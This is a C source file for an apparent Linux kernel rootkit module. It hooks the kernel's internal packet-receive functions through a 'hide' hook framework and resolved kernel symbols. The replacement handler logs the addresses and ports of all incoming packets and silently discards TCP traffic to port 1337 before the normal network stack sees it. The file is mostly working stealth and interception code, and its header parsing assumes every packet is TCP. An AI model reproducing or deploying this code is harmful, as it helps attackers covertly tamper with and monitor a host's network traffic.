#include <linux/netdevice.h>
#include <net/sock.h>
#include <linux/net.h>
#include <net/tcp.h>
#include <trace/events/net.h>

#include <license.h>
#include <hide.h>
#include <hook.h>
#include <ksyms.h>

// #define net_timestamp_check(COND, SKB)
//     if (static_branch_unlikely(ksyms__netstamp_needed_key)) {
//         if ((COND) && !(SKB)->tstamp)                        
//             __net_timestamp(SKB);                        
//     }                                                        

static int __netif_receive_skb_hook(struct sk_buff *skb)
{
    printk(KERN_INFO "__netif_receive_skb_hook!");

    return 0;
}

static int netif_rx_hook(struct sk_buff *skb)
{
    printk(KERN_INFO "netif_rx_hook!");
    return 0;
}

static void __netif_receive_skb_list(struct list_head *head)
{
    unsigned long noreclaim_flag = 0;
    struct sk_buff *skb, *next;
    bool pfmemalloc = false; /* Is current sublist PF_MEMALLOC? */

    /* hook variables */
    struct iphdr *ip;
    struct tcphdr *tcp;

    list_for_each_entry_safe(skb, next, head, list) {

        /* hook code start */

        ip = (struct iphdr *)skb_network_header(skb);
        tcp = (struct tcphdr *)((u8 *)ip + sizeof(struct iphdr));
        printk(KERN_INFO "src_ip: %x dst_ip: %x src_port: %d dst_port: %d",
            ntohl(ip->saddr), ntohl(ip->daddr), ntohs(tcp->source), ntohs(tcp->dest));
        
        if (ntohs(tcp->dest) == 1337) {
            skb_list_del_init(skb);
            continue;
        }

        /* hook code end */

        if ((sk_memalloc_socks() && skb_pfmemalloc(skb)) != pfmemalloc) {
            struct list_head sublist;
            
            /* Handle the previous sublist */
            list_cut_before(&sublist, head, &skb->list);

            if (!list_empty(&sublist))
                ksyms____netif_receive_skb_list_core(&sublist, pfmemalloc);
            pfmemalloc = !pfmemalloc;
            /* See comments in __netif_receive_skb */
            if (pfmemalloc)
                noreclaim_flag = memalloc_noreclaim_save();
            else
                memalloc_noreclaim_restore(noreclaim_flag);
        }
    }
    /* Handle the remaining sublist */
    if (!list_empty(head))
        ksyms____netif_receive_skb_list_core(head, pfmemalloc);
    /* Restore pflags */
    if (pfmemalloc)
        memalloc_noreclaim_restore(noreclaim_flag);
}

static void netif_receive_skb_list_internal_hook(struct list_head *head)
{
    struct sk_buff *skb, *next;
    struct list_head sublist;

    // printk(KERN_INFO "FINALLY A CORRECT HOOK!");

    INIT_LIST_HEAD(&sublist);
    list_for_each_entry_safe(skb, next, head, list) {
        // net_timestamp_check(netdev_tstamp_prequeue, skb);
        skb_list_del_init(skb);
        if (!skb_defer_rx_timestamp(skb))
            list_add_tail(&skb->list, &sublist);
    }
    list_splice_init(&sublist, head);

    rcu_read_lock();
#ifdef CONFIG_RPS
    if (static_branch_unlikely(&rps_needed)) {
        list_for_each_entry_safe(skb, next, head, list) {
            struct rps_dev_flow voidflow, *rflow = &voidflow;
            int cpu = ksyms__get_rps_cpu(skb->dev, skb, &rflow);

            if (cpu >= 0) {
                /* Will be handled, remove from list */
                skb_list_del_init(skb);
                ksyms__enqueue_to_backlog(skb, cpu, &rflow->last_qtail);
            }
        }
    }
#endif
    __netif_receive_skb_list(head);
    rcu_read_unlock();
}

// HOOK_DEFINE(hide, netif_receive_skb, &netif_receive_skb, &netif_receive_skb_hook);
HOOK_DEFINE(hide, __netif_receive_skb, ksyms____netif_receive_skb, &__netif_receive_skb_hook);
HOOK_DEFINE(hide, netif_rx, &netif_rx, &netif_rx_hook);
HOOK_DEFINE(hide, netif_receive_skb_list_internal, ksyms__netif_receive_skb_list_internal, &netif_receive_skb_list_internal_hook);
